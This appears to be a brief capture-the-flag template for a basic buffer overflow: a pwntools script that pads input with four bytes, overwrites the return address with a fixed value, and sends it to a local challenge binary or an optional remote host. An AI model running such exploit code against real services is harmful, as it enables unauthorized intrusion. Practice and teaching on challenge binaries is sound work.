The basic buffer overflow


Template
```
#!/usr/bin/env python3
from pwn import *

# uncomment this line to connect to remote
# p = remote("website.org", port_num)
p = process("./challenge") #only if you have the compiled code 

payload = b"A"*4
payload += p64(0x401289)

p.sendline(payload)

p.interactive()
```
